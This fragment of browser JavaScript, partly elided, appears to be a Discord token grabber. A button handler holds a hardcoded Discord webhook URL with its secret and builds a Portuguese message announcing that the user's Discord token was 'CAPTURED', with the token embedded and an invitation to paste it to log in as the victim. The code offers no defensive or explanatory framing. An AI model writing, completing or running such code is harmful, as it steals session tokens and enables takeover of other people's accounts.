document.addEventListener('DOMContentLoaded', () => {
    ...
    document.getElementById('getTokenButton').addEventListener('click', async () => {
        const webhookUrl = 'https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk';
        ...
        if (isLoggedIn) {
            ...
            // Mensagem formatada para o webhook
            const message = `Token de Discord CAPTURADA! Logo abaixo, copie e cole para logar!\n\n\`\`\`\n${token}\n\`\`\``;
